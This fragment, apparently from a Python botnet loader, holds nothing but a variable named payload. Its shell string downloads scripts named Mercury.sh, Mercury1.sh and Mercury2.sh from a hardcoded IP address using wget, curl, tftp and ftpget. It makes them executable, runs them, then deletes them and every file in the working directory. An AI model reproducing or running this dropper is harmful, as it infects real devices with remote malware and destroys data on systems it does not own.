...
payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.114.11.108/Mercury.sh; curl -O http://50.114.11.108/Mercury.sh; chmod 777 Mercury.sh; sh Mercury.sh; tftp 50.114.11.108 -c get Mercury.sh; chmod 777 Mercury.sh; sh Mercury.sh; tftp -r Mercury2.sh -g 50.114.11.108; chmod 777 Mercury2.sh; sh Mercury2.sh; ftpget -v -u anonymous -p anonymous -P 21 50.114.11.108 Mercury1.sh Mercury1.sh; sh Mercury1.sh; rm -rf Mercury.sh Mercury.sh Mercury2.sh Mercury1.sh; rm -rf *"
